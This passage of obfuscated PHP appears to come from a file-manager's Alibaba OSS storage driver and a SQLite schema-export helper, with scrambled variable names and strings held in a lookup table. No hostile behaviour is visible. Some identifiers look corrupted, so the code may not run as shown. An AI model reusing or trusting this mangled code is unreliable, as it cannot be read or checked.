$©Ë‚ÂÏ²[12], $úŠäÆïØ[$©Ë‚ÂÏ²[1041]] ? strtoupper(str_replace($©Ë‚ÂÏ²[11], $©Ë‚ÂÏ²[12], $úŠäÆïØ[$©Ë‚ÂÏ²[1041]])) : $©Ë‚ÂÏ²[12]); $ÖÀÍºŞÌ[] = trim(implode($©Ë‚ÂÏ²[53], $éÇÛöš)); } $‡å„“† = array($©Ë‚ÂÏ²[1220] . $£ø²çğä . $©Ë‚ÂÏ²[1221], $©Ë‚ÂÏ²[1222] . $£ø²çğä . $©Ë‚ÂÏ²[1223], implode($©Ë‚ÂÏ²[50] . PHP_EOL, $ÖÀÍºŞÌ), $©Ë‚ÂÏ²[1038]); $Ÿ¦»Œ…æ = implode(PHP_EOL, array_merge($‡å„“†, $Û¶ØÅ‰»)); if ($øìŒºô && $øìŒºô == $©Ë‚ÂÏ²[13]) { return $Ÿ¦»Œ…æ; } $¨ÄÎ¦–ø = array($©Ë‚ÂÏ²[894] => $ı‹»ç‚ç, $©Ë‚ÂÏ²[13] => $Ÿ¦»Œ…æ); return $øìŒºô ? $¨ÄÎ¦–ø[$øìŒºô] : $¨ÄÎ¦–ø; } public function sqlFromSqlite($Û¥Ö¯üù, $üÙ±Ç¹ = '') { $âÀ³ï— =& $_SERVER[´‹ô¯Œ]; $¾Í¯Â¾É = $this->model()->db(); $Å˜×æ– = "\120\x52\x41\x47\x4d\101\40\x54\x41\102\x4c\105\x5f\x49\x4e\106\117\40\50\47{$Û¥Ö¯üù}\x27\51"; $¥òŸÄ˜º = "\123\x45\114\105\x43\x54\40\52\40\106\x52\117\x4d\40\x73\161\154\151\x74\x65\x5f\155\x61\163\x74\x65\162\40\x57\x48\x45\x52\x45\x20\x74\x62\x6c\x5f\x6e\x61\155\145\x20\75\40\x27{$Û¥Ö¯üù}\47"; $§öÅ­áß = $¾Í¯Â¾É->query($Å˜×æ–); if (empty($§öÅ­áß)) { $Üçµ‹ºÈ = array($âÀ³ï—[894] => $âÀ³ï—[12], $âÀ³ï—[13] => $âÀ³ï—[12]); return $üÙ±Ç¹ ? $Üçµ‹ºÈ[$üÙ±Ç¹] : $Üçµ‹ºÈ; } $ä„÷É† = $¾Í¯Â¾É->query($¥òŸÄ˜º); $Œì¬Ùæ± = $¹Ä‰²‰ = array(); foreach ($ä„÷É† as $ë®ëŒúæ) { if ($ë®ëŒúæ[$âÀ³ï—[33]] == $âÀ³ï—[359]) { $Œì¬Ùæ±[] = $ë®ëŒúæ[$âÀ³ï—[1224]]; } else { $¹Ä‰²‰[$ë®ëŒúæ[$âÀ³ï—[32]]] = $ë®ëŒúæ[$âÀ³ï—[1224]]; } } $µƒš¾ı = array_merge(array($âÀ³ï—[1220] . $Û¥Ö¯üù . $âÀ³ï—[121]), $Œì¬Ùæ±, array_values($¹Ä‰²‰)); $µƒš¾ı = implode($âÀ³ï—[74] . PHP_EOL, $µƒš¾ı) . $âÀ³ï—[74]; if ($üÙ±Ç¹ && $üÙ±Ç¹ == $âÀ³ï—[13]) { return $µƒš¾ı; } $¥¾î…¾ = array(); foreach ($¹Ä‰²‰ as $—Ù« ¹“ => $¶Ë¿¶·) { $Èá®Ó¸è = str_replace($âÀ³ï—[1225] . $Û¥Ö¯üù . $âÀ³ï—[11], $âÀ³ï—[12], $—Ù« ¹“); $Èá®Ó¸è = str_replace($Û¥Ö¯üù . $âÀ³ï—[11], $âÀ³ï—[12], $—Ù« ¹“); $˜éŞéä› = str_replace(array($âÀ³ï—[121], $âÀ³ï—[1049]), $âÀ³ï—[464], substr($¶Ë¿¶·, stripos($¶Ë¿¶·, $âÀ³ï—[340]))); $¥¾î…¾[$Èá®Ó¸è] = $˜éŞéä›; } $ú™“°½Ë = array(); $éÇğÌÔ¶ = array($âÀ³ï—[1212] => $âÀ³ï—[1226], $âÀ³ï—[393] => $âÀ³ï—[1227]); $Ñáå±ú = $Ì¶•Ö¥Ş = $âÀ³ï—[12]; foreach ($§öÅ­áß as $ë®ëŒúæ) { if ($ë®ëŒúæ[$âÀ³ï—[57]] == $âÀ³ï—[91]) { $Ñáå±ú = $ë®ëŒúæ[$âÀ³ï—[32]]; } $É©˜šüŠ = $ë®ëŒúæ[$âÀ³ï—[33]]; if ($É©˜šüŠ == $âÀ³ï—[1228] && isset($¥¾î…¾[$ë®ëŒúæ[$âÀ³ï—[32]]])) { $É©˜šüŠ = $âÀ³ï—[1229]; } $‹õ¦ş¡ê = array($âÀ³ï—[464] . $ë®ëŒúæ[$âÀ³ï—[32]] . $âÀ³ï—[464], _get($éÇğÌÔ¶, $É©˜šüŠ, $É©˜šüŠ), $ë®ëŒúæ[$âÀ³ï—[35]] == $âÀ³ï—[91] ? $âÀ³ï—[1217] : $âÀ³ï—[1230] . $ë®ëŒúæ[$âÀ³ï—[56]], $ë®ëŒúæ[$âÀ³ï—[57]] == $âÀ³ï—[91] ? $âÀ³ï—[1231] : $âÀ³ï—[12]); $ú™“°½Ë[] = trim(implode($âÀ³ï—[53], $‹õ¦ş¡ê)); } foreach ($¥¾î…¾ as $Èá®Ó¸è => $˜éŞéä›) { if ($Èá®Ó¸è == $âÀ³ï—[1206]) { $ãÉûí = $Ì¶•Ö¥Ş = $âÀ³ï—[1232] . $Ñáå±ú . $âÀ³ï—[1233]; } else { $ãÉûí = (stripos($Èá®Ó¸è, $âÀ³ï—[11]) ? $âÀ³ï—[1234] : $âÀ³ï—[12]) . ($âÀ³ï—[1235] . $Èá®Ó¸è . $âÀ³ï—[1236] . $˜éŞéä›); } $ú™“°½Ë[] = $ãÉûí; } if ($Ñáå±ú && !$Ì¶•Ö¥Ş) { $ú™“°½Ë = array_merge(array($âÀ³ï—[1232] . $Ñáå±ú . $âÀ³ï—[1233]), $ú™“°½Ë); } $¯ÄÄ¼­ = array($âÀ³ï—[1237] . $Û¥Ö¯üù . $âÀ³ï—[1238], $âÀ³ï—[1239] . $Û¥Ö¯üù . $âÀ³ï—[1240], implode($âÀ³ï—[50] . PHP_EOL, $ú™“°½Ë), $âÀ³ï—[1241]); $ÊùÈ¨ú™ = implode(PHP_EOL, $¯ÄÄ¼­); if ($üÙ±Ç¹ && $üÙ±Ç¹ == $âÀ³ï—[894]) { return $ÊùÈ¨ú™; } $Üçµ‹ºÈ = array($âÀ³ï—[894] => $ÊùÈ¨ú™, $âÀ³ï—[13] => $µƒš¾ı); return $üÙ±Ç¹ ? $Üçµ‹ºÈ[$üÙ±Ç¹] : $Üçµ‹ºÈ; } } goto dòÎÛ¨Ä³È; AÜ‹ğ•ÜË„: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($“ÕÒ©‹) { parent::__construct(); include_once SDK_DIR . $_SERVER[´‹ô¯Œ][1487]; $this->_init($“ÕÒ©‹); } public function _init($ñ˜˜Æ‡Ä) { $–šãÜ¢Ã =& $_SERVER[´‹ô¯Œ]; $this->config = $ñ˜˜Æ‡Ä; foreach ($ñ˜˜Æ‡Ä as $Ş¢ùÁ¾ => $ÙÆìÀ İ) { if (isset($this->{$Ş¢ùÁ¾})) { $this->{$Ş¢ùÁ¾} = $ÙÆìÀ İ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($–šãÜ¢Ã[1488] . LNG($–šãÜ¢Ã[1489])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $§òœª…ã =& $_SERVER[´‹ô¯Œ]; $ëã·åª = new OSS\Model\CorsConfig(); $Ú”ƒîÒê = new OSS\Model\CorsRule(); $Ú”ƒîÒê->addAllowedOrigin($§òœª…ã[1490]); $Ú”ƒîÒê->addAllowedMethod($§òœª…ã[1491]); $Ú”ƒîÒê->addAllowedMethod($§òœª…ã[1492]); $Ú”ƒîÒê->addAllowedMethod($§òœª…ã[1493]); $Ú”ƒîÒê->addAllowedMethod($§òœª…ã[1494]); $Ú”ƒîÒê->addAllowedMethod($§òœª…ã[165]); $Ú”ƒîÒê->setMaxAgeSeconds(600); $Ú”ƒîÒê->addExposeHeader($§òœª…ã[1495]); $Ú”ƒîÒê->addAllowedHeader($§òœª…ã[1490]); $ëã·åª->addRule($Ú”ƒîÒê); try { $this->client->putBucketCors($this->bucket, $ëã·åª); } catch (OSS\Core\OssException $Ï¨šÖ) { $this->writeLog(__FUNCTION__ . $§òœª…ã[215] . $Ï¨šÖ->getMessage()); return !1; } return !0; } public function getBucketCors() { $€î–öèÙ =& $_SERVER[´‹ô¯Œ]; $¿½˜¤ò = null; try { $¿½˜¤ò = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¸œ¶éåğ) { $this->writeLog(__FUNCTION__ . $€î–öèÙ[215] . $¸œ¶éåğ->getMessage()); return null; } if (!$¿½˜¤ò || !($—¼À´éş = $¿½˜¤ò->getRules())) { return null; } $­û—Çò¼ = $—¼À´éş[0]->getAllowedOrigins(); $ëÓŠÑ›· = $—¼À´éş[0]->getAllowedMethods(); $ï‰˜î¼Ü = $—¼À´éş[0]->getMaxAgeSeconds(); $™şüîå = $—¼À´éş[0]->getExposeHeaders(); $ºıı©éí = $—¼À´éş[0]->getAllowedHeaders(); return array($€î–öèÙ[221] => isset($­û—Çò¼[0]) ? $­û—Çò¼[0] : $€î–öèÙ[12], $€î–öèÙ[225] => $ëÓŠÑ›·, $€î–öèÙ[1496] => $ï‰˜î¼Ü, $€î–öèÙ[1497] => isset($™şüîå[0]) ? $™şüîå[0] : $€î–öèÙ[12], $€î–öèÙ[222] => isset($ºıı©éí[0]) ? $ºıı©éí[0] : $€î–öèÙ[12]); } public function isBucketCors() { $¨¢­ÂÑÏ =& $_SERVER[´‹ô¯Œ]; $ôÛûİ™ñ = $this->getBucketCors(); if (!$ôÛûİ™ñ || !is_array($ôÛûİ™ñ)) { return !1; } if ($ôÛûİ™ñ[$¨¢­ÂÑÏ[221]] != $¨¢­ÂÑÏ[223] || $ôÛûİ™ñ[$¨¢­ÂÑÏ[222]] != $¨¢­ÂÑÏ[223]) { return !1; } $¯©ıÄ«Ö = array_map($¨¢­ÂÑÏ[224], $ôÛûİ™ñ[$¨¢­ÂÑÏ[225]]); if (!is_array($¯©ıÄ«Ö)) { $¯©ıÄ«Ö = array(); } $È ã™ı” = array($¨¢­ÂÑÏ[226], $¨¢­ÂÑÏ[227], $¨¢­ÂÑÏ[228], $¨¢­ÂÑÏ[229], $¨¢­ÂÑÏ[230]); $üáö„Ù½ = array_diff($È ã™ı”, $¯©ıÄ«Ö); return empty($üáö„Ù½); } public function mkfile($“ôÒÂš–, $­óŒ›†‡ = '', $ºù¡ßşŒ = REPEAT_RENAME) { $øúØ„—¸ = $this->setContent($“ôÒÂš–, $­óŒ›†‡); if ($øúØ„—¸ !== !1) { return $this->getPathOuter($“ôÒÂš–); } return !1; } public function mkdir($–Æğ¤ûÎ, $òÏÖÇ´– = REPEAT_SKIP) { if ($òÏÖÇ´– && $this->_isFolder($–Æğ¤ûÎ)) { return $this->getPathOuter($–Æğ¤ûÎ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($–Æğ¤ûÎ)); } catch (OSS\Core\OssException $ØÎŞêİŒ) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][215] . $ØÎŞêİŒ->getMessage()); return !1; } return $this->getPathOuter($–Æğ¤ûÎ); } private function fileList($½Æ“Í×„, $‹“Û‹ŠÍ = '', $ÔÓæŒƒ§ = 0) { $æ£»íó =& $_SERVER[´‹ô¯Œ]; $½Æ“Í×„ = trim($½Æ“Í×„, $æ£»íó[8]); $ãÖŞÀËÔ = empty($½Æ“Í×„) && $½Æ“Í×„ !== $æ£»íó[231] ? $æ£»íó[12] : $½Æ“Í×„ . $æ£»íó[8]; $ùÅğñÉ‰ = $æ£»íó[12]; $Àœö¬í = 1000; $Çê×†÷Ú = $÷ªÙ¡©³ = array(); while (!0) { check_abort(); $€¡şö¨À = array($æ£»íó[1498] => $‹“Û‹ŠÍ, $æ£»íó[1499] => $ãÖŞÀËÔ, $æ£»íó[1500] => $Àœö¬í, $æ£»íó[1501] => $ùÅğñÉ‰); try { $ı±‚µ³´ = $this->client->listObjects($this->bucket, $€¡şö¨À); } catch (OSS\Core\OssException $äâ¤º¸Ø) { $this->writeLog(__FUNCTION__ . $æ£»íó[215] . $äâ¤º¸Ø->getMessage()); break; } $ùÅğñÉ‰ = $ı±‚µ³´->getNextMarker(); $î¯ÑÅíÁ = $ı±‚µ³´->getObjectList(); $ìƒç¯³Ä = $ı±‚µ³´->getPrefixList(); foreach ($î¯ÑÅíÁ as $™º¼ÙÊ…) { if ($™º¼ÙÊ…->getKey() == $ãÖŞÀËÔ) { continue; } $òªÂ£·‰ = $™º¼ÙÊ…->getKey(); $ÄÑÌ„ËÑ = $™º¼ÙÊ…->getSize(); $èìòıæ• = $™º¼ÙÊ…->getLastModified(); $°ˆæëáÍ = trim($™º¼ÙÊ…->getETag(), $æ£»íó[121]); $¿ù¢çØ½ = $ÔÓæŒƒ§ ? array($æ£»íó[32] => $òªÂ£·‰, $æ£»íó[79] => $ÄÑÌ„ËÑ, $æ£»íó[207] => strtotime($èìòıæ•), $æ£»íó[1502] => $°ˆæëáÍ) : $òªÂ£·‰; $òñß°É = $ÄÑÌ„ËÑ == 0 && substr($òªÂ£·‰, strlen($òªÂ£·‰) - 1, 1) == $æ£»íó[8] ? !0 : !1; $ê½Ï­³ä = array($æ£»íó[79] => $ÄÑÌ„ËÑ, $æ£»íó[1503] => $ÄÑÌ„ËÑ, $æ£»íó[88] => strtotime($èìòıæ•), $æ£»íó[1504] => $èìòıæ•, $æ£»íó[1502] => $°ˆæëáÍ); $this->cacheMethodInfoSet($òªÂ£·‰, $òñß°É, $ê½Ï­³ä); if ($òñß°É) { $Çê×†÷Ú[] = $òªÂ£·‰; continue; } $÷ªÙ¡©³[] = $¿ù¢çØ½; } foreach ($ìƒç¯³Ä as $´–ô¶˜) { $Çê×†÷Ú[] = $´–ô¶˜->getPrefix(); $this->cacheMethodInfoSet($´–ô¶˜->getPrefix(), !0); } if ($ùÅğñÉ‰ === $æ£»íó[12]) { break; } } $this->cacheMethodInfoSet($½Æ“Í×„, !0); return array($æ£»íó[85] => $Çê×†÷Ú, $æ£»íó[86] => $÷ªÙ¡©³); } public function listObject($·â–İ÷«, $²“ë”” = '') { $îô¼­ÒÀ =& $_SERVER[´‹ô¯Œ]; $·â–İ÷« = trim($·â–İ÷«, $îô¼­ÒÀ[8]); $ÂÇáÍÕ = empty($·â–İ÷«) && $·â–İ÷« !== $îô¼­ÒÀ[231] ? $îô¼­ÒÀ[12] : $·â–İ÷« . $îô¼­ÒÀ[8]; $†³òÛØÑ = $îô¼­ÒÀ[12]; $ßûå¼ô– = 1000; $œ°ğşÊ— = $£–Âæ½ = array(); while (!0) { check_abort(); $Ù‘ü–Î‚ = array($îô¼­ÒÀ[1498] => $²“ë””, $îô¼­ÒÀ[1499] => $ÂÇáÍÕ, $îô¼­ÒÀ[1500] => $ßûå¼ô–, $îô¼­ÒÀ[1501] => $†³òÛØÑ); try { $ç†‘‡æÂ = $this->client->listObjects($this->bucket, $Ù‘ü–Î‚); } catch (OSS\Core\OssException $¾¦Öñòƒ) { $this->writeLog(__FUNCTION__ . $îô¼­ÒÀ[215] . $¾¦Öñòƒ->getMessage()); break; } $†³òÛØÑ = $ç†‘‡æÂ->getNextMarker(); $æ‚Ñ½Îã = $ç†‘‡æÂ->getObjectList(); foreach ($æ‚Ñ½Îã as $›…ºëÁ) { if ($›…ºëÁ->getKey() == $ÂÇáÍÕ) { continue; } $ı¥òó¬ó = $›…ºëÁ->getKey(); $¡Ö ››‘ = $›…ºëÁ->getSize(); $ï¿ŸŞÙ“ = $¡Ö ››‘ == 0 && substr($ı¥òó¬ó, strlen($ı¥òó¬ó) - 1, 1) == $îô¼­ÒÀ[8] ? !0 : !1; if ($ï¿ŸŞÙ“) { continue; } $£–Âæ½[] = $¡Ö ››‘ . $îô¼­ÒÀ[215] . $ı¥òó¬ó; } if ($†³òÛØÑ === $îô¼­ÒÀ[12]) { break; } } return array($îô¼­ÒÀ[85] => $œ°ğşÊ—, $îô¼­ÒÀ[86] => $£–Âæ½); } public function copyFile($â’§—†ó, $èÀÆïåá) { $Ì¾äÑî = $this->size($â’§—†ó); if ($Ì¾äÑî < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $â’§—†ó, $this->bucket, $this->pathEncode($èÀÆïåá)); } catch (OSS\Core\OssException $¼İĞŞ‚¨) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][215] . $¼İĞŞ‚¨->getMessage()); return !1; } return $this->getPathOuter($èÀÆïåá); } $ŸİØ·Û = $this->multiCopyObject($â’§—†ó, $èÀÆïåá, $Ì¾äÑî); return $ŸİØ·Û ? $this->getPathOuter($èÀÆïåá) : !1; } private function multiCopyObject($å¼šı†”, $ôÃïª™­, $»ë¾ø§™) { $èõÂééõ =& $_SERVER[´‹ô¯Œ]; try { $í”ƒúŒ¸ = array(); if ($ı”ï¨¨¿ = $this->hashMd5($å¼šı†”)) { $í”ƒúŒ¸ = array(OSS\OssClient::OSS_HEADERS => array($èõÂééõ[1505] => $ı”ï¨¨¿)); } $¶ÇÊæ• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ôÃïª™­), $í”ƒúŒ¸); $Õ¬–ã½ = 1; $‘ÆœË“„ = 0; $í¾ç”ç = array(); $à‹—áŞ = 1024 * 1024 * 10; $¢ş³—şí = $this->client->generateMultiuploadParts($»ë¾ø§™, $à‹—áŞ); foreach ($¢ş³—şí as $çøĞÁúŒ => $³ŠæöÛá) { $à´®ª€ª = $‘ÆœË“„ + (int) $³ŠæöÛá[$èõÂééõ[1506]]; $«Ê•´¦ = (int) $³ŠæöÛá[$èõÂééõ[415]] + $à´®ª€ª - 1; $‡ë¥§Š = array($èõÂééõ[167] => $à´®ª€ª, $èõÂééõ[168] => $«Ê•´¦); $í¾ç”ç[] = $this->client->uploadPartCopy($this->bucket, $å¼šı†”, $this->bucket, $this->pathEncode($ôÃïª™­), $Õ¬–ã½, $¶ÇÊæ•, $‡ë¥§Š); $Õ¬–ã½ = $Õ¬–ã½ + 1; } $Œ“î¬–ˆ = array(); foreach ($í¾ç”ç as $çøĞÁúŒ => $­”Ç«) { $Œ“î¬–ˆ[] = array($èõÂééõ[300] => $çøĞÁúŒ + 1, $èõÂééõ[301] => $­”Ç«); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ôÃïª™­), $¶ÇÊæ•, $Œ“î¬–ˆ); } catch (OSS\Core\OssException $îÃÜ­¼À) { $this->writeLog(__FUNCTION__ . $èõÂééõ[215] . $îÃÜ­¼À->getMessage()); return !1; } return !0; } public function moveFile($Éùß†´ú, $›Ÿğ–˜”) { if ($this->copyFile($Éùß†´ú, $›Ÿğ–˜”)) { $this->remove($Éùß†´ú); return $this->getPathOuter($›Ÿğ–˜”); } return !1; } public function delFile($€¯Û¶ñµ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($€¯Û¶ñµ)); } catch (OSS\Core\OssException $İ÷ıæ§) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][215] . $İ÷ıæ§->getMessage()); return !1; } return !0; } public function delFolder($ÓòàƒÙ) { $•«ú¸·Û =& $_SERVER[´‹ô¯Œ]; if (!$this->exist($ÓòàƒÙ)) { return !0; } $this->listItemCache = !1; $‘×¿­ˆ = $this->fileList($ÓòàƒÙ); $this->listItemCache = !0; $¾ùŠ±¢º = trim($ÓòàƒÙ, $•«ú¸·Û[8]) . $•«ú¸·Û[8]; if (!empty($ÓòàƒÙ) && $ÓòàƒÙ !== $•«ú¸·Û[231] && !in_array($¾ùŠ±¢º, $‘×¿­ˆ[$•«ú¸·Û[85]])) { $‘×¿­ˆ[$•«ú¸·Û[85]][] = $¾ùŠ±¢º; } $óØìå®¨ = $this->delByBatch($‘×¿­ˆ[$•«ú¸·Û[86]]); if (!$óØìå®¨) { return !1; } $óØìå®¨ = $this->delByBatch($‘×¿­ˆ[$•«ú¸·Û[85]]); if (!$óØìå®¨) { return !1; } return $this->delFile($¾ùŠ±¢º); } private function delByBatch($¦»÷Æç÷) { foreach (array_chunk($¦»÷Æç÷, 1000) as $Æ†Ú ş) { try { $this->client->deleteObjects($this->bucket, $Æ†Ú ş); } catch (OSS\Core\OssException $ŞŒõÓßÄ) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][215] . $ŞŒõÓßÄ->getMessage()); return !1; } } return !0; } public function rename($»ÔÕßşğ, $Ú½½Öåç) { return $this->renameObject($»ÔÕßşğ, $Ú½½Öåç); } private function fileInfo($ö”í²ÛÈ, $ë¶å›ê¥ = false, $›¦¬Ãì™ = array()) { $¢¯ÏÊ¨€ =& $_SERVER[´‹ô¯Œ]; $¥¶ÏÙÖñ = array($¢¯ÏÊ¨€[32] => $this->pathThis($ö”í²ÛÈ), $¢¯ÏÊ¨€[87] => $this->getPathOuter($ö”í²ÛÈ), $¢¯ÏÊ¨€[33] => $¢¯ÏÊ¨€[233], $¢¯ÏÊ¨€[79] => isset($›¦¬Ãì™[$¢¯ÏÊ¨€[79]]) ? $›¦¬Ãì™[$¢¯ÏÊ¨€[79]] : 0, $¢¯ÏÊ¨€[169] => $this->ext($ö”í²ÛÈ)); if ($ë¶å›ê¥) { return $¥¶ÏÙÖñ; } $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[234]] = $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[88]] = 0; $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[235]] = $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[236]] = !0; if (empty($›¦¬Ãì™)) { $„Ì«¹–˜ = $this->objectMeta($ö”í²ÛÈ); if (!$„Ì«¹–˜) { return $¥¶ÏÙÖñ; } $›¦¬Ãì™ = array($¢¯ÏÊ¨€[88] => strtotime($„Ì«¹–˜[$¢¯ÏÊ¨€[1504]]), $¢¯ÏÊ¨€[79] => $„Ì«¹–˜[$¢¯ÏÊ¨€[1503]] + 0, $¢¯ÏÊ¨€[1502] => $„Ì«¹–˜[$¢¯ÏÊ¨€[1502]]); } if (isset($›¦¬Ãì™[$¢¯ÏÊ¨€[1502]]) && $›¦¬Ãì™[$¢¯ÏÊ¨€[1502]]) { $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[238]] = trim($›¦¬Ãì™[$¢¯ÏÊ¨€[1502]], $¢¯ÏÊ¨€[121]); } if (isset($›¦¬Ãì™[$¢¯ÏÊ¨€[79]])) { $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[79]] = $›¦¬Ãì™[$¢¯ÏÊ¨€[79]]; } if (isset($›¦¬Ãì™[$¢¯ÏÊ¨€[88]])) { $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[88]] = $›¦¬Ãì™[$¢¯ÏÊ¨€[88]]; } if (isset($›¦¬Ãì™[$¢¯ÏÊ¨€[207]]) && !trim($¥¶ÏÙÖñ[$¢¯ÏÊ¨€[88]])) { $¥¶ÏÙÖñ[$¢¯ÏÊ¨€[88]] = $›¦¬Ãì™[$¢¯ÏÊ¨€[207]]; } return $¥¶ÏÙÖñ; } private function folderInfo($ıáÌÊ , $”ëØ“®µ = false, $ö³ÙÁ–· = array()) { $Ùö˜ùÚ =& $_SERVER[´‹ô¯Œ]; $æ„Â‰£í = array($Ùö˜ùÚ[32] => $this->pathThis($ıáÌÊ ), $Ùö˜ùÚ[87] => $this->getPathOuter($Ùö˜ùÚ[8] . $ıáÌÊ ), $Ùö˜ùÚ[33] => $Ùö˜ùÚ[78]); if ($”ëØ“®µ) { return $æ„Â‰£í; } $æ„Â‰£í[$Ùö˜ùÚ[234]] = $æ„Â‰£í[$Ùö˜ùÚ[88]] = 0; $æ„Â‰£í[$Ùö˜ùÚ[235]] = $æ„Â‰£í[$Ùö˜ùÚ[236]] = !0; if (empty($ö³ÙÁ–·)) { $ıáÌÊ  = rtrim($ıáÌÊ , $Ùö˜ùÚ[8]) . $Ùö˜ùÚ[8]; $Şùª¹»œ = $this->objectMeta($ıáÌÊ ); if (!$Şùª¹»œ) { return $æ„Â‰£í; } $ö³ÙÁ–· = array($Ùö˜ùÚ[234] => $Şùª¹»œ[$Ùö˜ùÚ[589]][$Ùö˜ùÚ[1507]], $Ùö˜ùÚ[88] => strtotime($Şùª¹»œ[$Ùö˜ùÚ[1504]])); } if (isset($ö³ÙÁ–·[$Ùö˜ùÚ[88]])) { $æ„Â‰£í[$Ùö˜ùÚ[88]] = $ö³ÙÁ–·[$Ùö˜ùÚ[88]]; } if (isset($ö³ÙÁ–·[$Ùö˜ùÚ[234]])) { $æ„Â‰£í[$Ùö˜ùÚ[234]] = $ö³ÙÁ–·[$Ùö˜ùÚ[234]]; } return $æ„Â‰£í; } public function listPath($µŸ±õ¹, $¥“†ÄµŸ = false) { $ıÈÖÓì¯ =& $_SERVER[´‹ô¯Œ]; $³÷·ÌĞ” = $this->fileList($µŸ±õ¹, $ıÈÖÓì¯[8], !0); foreach ($³÷·ÌĞ”[$ıÈÖÓì¯[85]] as $ö–¶à®§ => $ş°—¡Ÿ) { $³÷·ÌĞ”[$ıÈÖÓì¯[85]][$ö–¶à®§] = $this->folderInfo($ş°—¡Ÿ, $¥“†ÄµŸ, $ş°—¡Ÿ); } foreach ($³÷·ÌĞ”[$ıÈÖÓì¯[86]] as $ö–¶à®§ => $ş°—¡Ÿ) { $³÷·ÌĞ”[$ıÈÖÓì¯[86]][$ö–¶à®§] = $this->fileInfo($ş°—¡Ÿ[$ıÈÖÓì¯[32]], $¥“†ÄµŸ, $ş°—¡Ÿ); } return $³÷·ÌĞ”; } protected function infoChildren($ÖÇƒµ÷, &$ä½†…İŒ) { $ÀºŠÖîµ =& $_SERVER[´‹ô¯Œ]; $ş ³ãˆÖ = $this->fileList($ÖÇƒµ÷, $ÀºŠÖîµ[12], !0); $ä½†…İŒ[$ÀºŠÖîµ[81]] += count($ş ³ãˆÖ[$ÀºŠÖîµ[85]]); $ä½†…İŒ[$ÀºŠÖîµ[80]] += count($ş ³ãˆÖ[$ÀºŠÖîµ[86]]); foreach ($ş ³ãˆÖ[$ÀºŠÖîµ[86]] as $®Ó…Î‘Ø) { if (!$®Ó…Î‘Ø || !$®Ó…Î‘Ø[$ÀºŠÖîµ[79]]) { continue; } $ä½†…İŒ[$ÀºŠÖîµ[79]] += $®Ó…Î‘Ø[$ÀºŠÖîµ[79]]; } } public function has($ûÈÄ¾÷­, $¹Õã†³ = false, $Ô™ØÊÒº = true) { $Ì¥ç½‡ñ =& $_SERVER[´‹ô¯Œ]; $ûÈÄ¾÷­ = trim($ûÈÄ¾÷­, $Ì¥ç½‡ñ[8]); $²½¦Û¨× = empty($ûÈÄ¾÷­) && $ûÈÄ¾÷­ !== $Ì¥ç½‡ñ[231] ? $Ì¥ç½‡ñ[12] : $ûÈÄ¾÷­ . $Ì¥ç½‡ñ[8]; $ÄÄ‹õòÔ = $Ì¥ç½‡ñ[12]; $İ›Ñøéë = 500; $ÜìÙ‰‰ø = $‹ïÏíğ = 0; while (!0) { check_abort(); $ª…ˆçíÕ = array($Ì¥ç½‡ñ[1498] => $Ì¥ç½‡ñ[8], $Ì¥ç½‡ñ[1499] => $²½¦Û¨×, $Ì¥ç½‡ñ[1500] => $İ›Ñøéë, $Ì¥ç½‡ñ[1501] => $ÄÄ‹õòÔ); try { $÷ä€¬õ¢ = $this->client->listObjects($this->bucket, $ª…ˆçíÕ); } catch (OSS\Core\OssException $ù¶ŸßÇş) { $this->writeLog(__FUNCTION__ . $Ì¥ç½‡ñ[215] . $ù¶ŸßÇş->getMessage()); break; } $ÄÄ‹õòÔ = $÷ä€¬õ¢->getNextMarker(); $£àêç²­ = $÷ä€¬õ¢->getObjectList(); $Ä¢ƒÕì = $÷ä€¬õ¢->getPrefixList(); if ($¹Õã†³) { if (count($£àêç²­) > 1 || count($£àêç²­) == 1 && $£àêç²­[0]->getKey() != $²½¦Û¨×) { $ÜìÙ‰‰ø += count($£àêç²­) - 1; } if (!empty($Ä¢ƒÕì)) { $‹ïÏíğ += count($Ä¢ƒÕì); } if ($ÄÄ‹õòÔ === $Ì¥ç½‡ñ[12]) { break; } continue; } if ($Ô™ØÊÒº) { if (!empty($£àêç²­)) { if (count($£àêç²­) > 1 || $£àêç²­[0]->getKey() != $²½¦Û¨×) { return !0; } } } else { if (!empty($Ä¢ƒÕì)) { return !0; } } if ($ÄÄ‹õòÔ === $Ì¥ç½‡ñ[12]) { break; } } if ($¹Õã†³) { return array($Ì¥ç½‡ñ[242] => $ÜìÙ‰‰ø, $Ì¥ç½‡ñ[243] => $‹ïÏíğ); } return !1; } public function listAll($€ê†ºŠş) { $²ŒÜ¨†¸ =& $_SERVER[´‹ô¯Œ]; $ÁµÊé‚ = $this->fileList($€ê†ºŠş, $²ŒÜ¨†¸[12], !0); $´Òë®Œ“ = array_to_keyvalue($ÁµÊé‚[$²ŒÜ¨†¸[86]], $²ŒÜ¨†¸[32]); foreach ($ÁµÊé‚[$²ŒÜ¨†¸[85]] as $›Ã­™­) { if (is_string($›Ã­™­)) { $´Òë®Œ“[$›Ã­™­] = array($²ŒÜ¨†¸[79] => 0); } } return $this->listAllFiles($€ê†ºŠş, $´Òë®Œ“); } public function canRead($À·ÛÙ¬š) { $¿ôçöˆ² =& $_SERVER[´‹ô¯Œ]; $ìÅÈİÍ = $this->pathAcl($À·ÛÙ¬š); return 